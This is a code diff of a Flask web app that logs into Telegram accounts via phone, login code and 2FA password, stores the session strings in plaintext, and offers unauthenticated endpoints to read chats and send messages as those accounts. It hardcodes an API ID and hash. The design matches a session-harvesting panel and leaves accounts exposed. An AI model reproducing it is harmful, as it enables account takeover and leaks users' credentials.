@@ -5,70 +5,55 @@ from telethon.sessions import StringSession
 import json
 import os
 import asyncio
-import nest_asyncio
 from datetime import datetime
+import sys
 import logging
 
-# Apply nest_asyncio to allow nested event loops
-nest_asyncio.apply()
-
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[logging.StreamHandler(sys.stdout)]
+)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 CORS(app)
 
-# Your API credentials from environment variables
+# Your API credentials
 API_ID = int(os.environ.get('API_ID', 33465589))
 API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')
 
-# Store temporary data for OTP
+# Simple in-memory storage
+accounts = []
 temp_data = {}
 
-# Store accounts persistently
-accounts = []
+# Load accounts if exists
 if os.path.exists('accounts.json'):
     try:
         with open('accounts.json', 'r') as f:
             accounts = json.load(f)
-    except Exception as e:
-        logger.error(f"Error loading accounts: {e}")
+        logger.info(f"Loaded {len(accounts)} accounts")
+    except:
         accounts = []
 
-# Helper function to run async functions
 def run_async(coro):
-    """Run async function in sync context"""
-    try:
-        loop = asyncio.get_event_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
-    if loop.is_running():
-        # If loop is already running, create a new one
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
+    """Simple async runner"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
     return loop.run_until_complete(coro)
 
 @app.route('/')
 def index():
     """Serve login page"""
-    try:
-        return send_file('login.html')
-    except Exception as e:
-        logger.error(f"Error serving login.html: {e}")
-        return "Login page not found", 404
+    logger.info("Serving login page")
+    return send_file('login.html')
 
 @app.route('/dashboard')
 def dashboard():
     """Serve dashboard page"""
-    try:
-        return send_file('dashboard.html')
-    except Exception as e:
-        logger.error(f"Error serving dashboard.html: {e}")
-        return "Dashboard page not found", 404
+    logger.info("Serving dashboard page")
+    return send_file('dashboard.html')
 
 @app.route('/api/accounts', methods=['GET'])
 def get_accounts():
@@ -77,39 +62,31 @@ def get_accounts():
 
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
-    """Start account addition process"""
+    """Add new account"""
     data = request.json
     phone = data.get('phone')
     
     if not phone:
-        return jsonify({'success': False, 'error': 'Phone number required'})
+        return jsonify({'success': False, 'error': 'Phone required'})
     
-    # Create a unique ID for this session
-    session_id = str(len(temp_data) + 1)
+    session_id = f"session_{len(temp_data)}"
     
     try:
-        # Start client
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         run_async(client.connect())
         
         if not run_async(client.is_user_authorized()):
-            # Send code request
             run_async(client.send_code_request(phone))
-            
-            # Store client for later use
             temp_data[session_id] = {
                 'client': client,
-                'phone': phone,
-                'step': 'waiting_code'
+                'phone': phone
             }
-            
             return jsonify({
                 'success': True,
                 'session_id': session_id,
                 'next_step': 'code'
             })
         else:
-            # Already authorized
             me = run_async(client.get_me())
             session_string = run_async(client.session.save())
             
@@ -117,8 +94,7 @@ def add_account():
                 'id': len(accounts) + 1,
                 'phone': phone,
                 'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
-                'session': session_string,
-                'added': datetime.now().isoformat()
+                'session': session_string
             }
             
             accounts.append(account)
@@ -126,14 +102,10 @@ def add_account():
                 json.dump(accounts, f)
             
             run_async(client.disconnect())
-            
-            return jsonify({
-                'success': True,
-                'account': account
-            })
+            return jsonify({'success': True, 'account': account})
             
     except Exception as e:
-        logger.error(f"Error adding account: {e}")
+        logger.error(f"Add account error: {str(e)}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/verify-code', methods=['POST'])
@@ -152,74 +124,44 @@ def verify_code():
     phone = temp['phone']
     
     try:
-        if temp.get('step') == 'waiting_code':
+        try:
             run_async(client.sign_in(phone, code))
-            me = run_async(client.get_me())
-            
-            # Save session
-            session_string = run_async(client.session.save())
-            
-            account = {
-                'id': len(accounts) + 1,
-                'phone': phone,
-                'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
-                'session': session_string,
-                'added': datetime.now().isoformat()
-            }
-            
-            accounts.append(account)
-            with open('accounts.json', 'w') as f:
-                json.dump(accounts, f)
-            
-            run_async(client.disconnect())
-            del temp_data[session_id]
-            
-            return jsonify({
-                'success': True,
-                'account': account
-            })
-            
-    except errors.SessionPasswordNeededError:
-        if password:
-            run_async(client.sign_in(password=password))
-            me = run_async(client.get_me())
-            
-            session_string = run_async(client.session.save())
-            
-            account = {
-                'id': len(accounts) + 1,
-                'phone': phone,
-                'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
-                'session': session_string,
-                'added': datetime.now().isoformat()
-            }
-            
-            accounts.append(account)
-            with open('accounts.json', 'w') as f:
-                json.dump(accounts, f)
-            
-            run_async(client.disconnect())
-            del temp_data[session_id]
-            
-            return jsonify({
-                'success': True,
-                'account': account
-            })
-        else:
-            temp['step'] = 'need_password'
-            return jsonify({
-                'success': False,
-                'need_password': True,
-                'message': '2FA password required'
-            })
-            
+        except errors.SessionPasswordNeededError:
+            if password:
+                run_async(client.sign_in(password=password))
+            else:
+                return jsonify({
+                    'success': False,
+                    'need_password': True,
+                    'message': '2FA required'
+                })
+        
+        me = run_async(client.get_me())
+        session_string = run_async(client.session.save())
+        
+        account = {
+            'id': len(accounts) + 1,
+            'phone': phone,
+            'name': f"{me.first_name or ''} {me.last_name or ''}".strip() or 'User',
+            'session': session_string
+        }
+        
+        accounts.append(account)
+        with open('accounts.json', 'w') as f:
+            json.dump(accounts, f)
+        
+        run_async(client.disconnect())
+        del temp_data[session_id]
+        
+        return jsonify({'success': True, 'account': account})
+        
     except Exception as e:
-        logger.error(f"Error verifying code: {e}")
+        logger.error(f"Verify code error: {str(e)}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/get-messages', methods=['POST'])
 def get_messages():
-    """Get chats and messages for an account"""
+    """Get chats"""
     data = request.json
     account_id = data.get('accountId')
     
@@ -234,13 +176,10 @@ def get_messages():
         if not run_async(client.is_user_authorized()):
             return jsonify({'success': False, 'error': 'Not authorized'})
         
-        # Get dialogs (chats)
         dialogs = run_async(client.get_dialogs())
-        
         chats = []
-        messages = []
         
-        for dialog in dialogs[:20]:  # Limit to 20 chats
+        for dialog in dialogs[:20]:
             chat = {
                 'id': str(dialog.id),
                 'title': dialog.name or 'Unknown',
@@ -249,33 +188,17 @@ def get_messages():
                 'lastMessageDate': dialog.message.date.timestamp() if dialog.message else None
             }
             chats.append(chat)
-            
-            # Get recent messages for this chat
-            msg_list = run_async(client.get_messages(dialog.entity, limit=20))
-            for msg in msg_list:
-                if msg.message:
-                    messages.append({
-                        'chatId': str(dialog.id),
-                        'text': msg.message,
-                        'date': msg.date.timestamp(),
-                        'out': msg.out
-                    })
         
         run_async(client.disconnect())
-        
-        return jsonify({
-            'success': True,
-            'chats': chats,
-            'messages': messages
-        })
+        return jsonify({'success': True, 'chats': chats, 'messages': []})
         
     except Exception as e:
-        logger.error(f"Error getting messages: {e}")
+        logger.error(f"Get messages error: {str(e)}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
-    """Send a message to a chat"""
+    """Send message"""
     data = request.json
     account_id = data.get('accountId')
     chat_id = data.get('chatId')
@@ -292,23 +215,19 @@ def send_message():
         if not run_async(client.is_user_authorized()):
             return jsonify({'success': False, 'error': 'Not authorized'})
         
-        # Get entity
         entity = run_async(client.get_entity(int(chat_id)))
-        
-        # Send message
         run_async(client.send_message(entity, message))
-        
         run_async(client.disconnect())
         
         return jsonify({'success': True})
         
     except Exception as e:
-        logger.error(f"Error sending message: {e}")
+        logger.error(f"Send message error: {str(e)}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
-    """Remove an account"""
+    """Remove account"""
     data = request.json
     account_id = data.get('accountId')
     
@@ -320,13 +239,13 @@ def remove_account():
     
     return jsonify({'success': True})
 
-@app.route('/health', methods=['GET'])
-def health_check():
-    """Health check endpoint for Render"""
-    return jsonify({'status': 'healthy'}), 200
+@app.route('/health')
+def health():
+    """Health check"""
+    return jsonify({'status': 'ok'})
 
+# This is critical for Render
 if __name__ == '__main__':
-    # Get port from environment variable (Render sets PORT)
-    port = int(os.environ.get('PORT', 5000))
-    # Bind to 0.0.0.0 to make it accessible externally
+    port = int(os.environ.get('PORT', 10000))
+    logger.info(f"Starting Flask app on port {port}")
     app.run(host='0.0.0.0', port=port, debug=False)
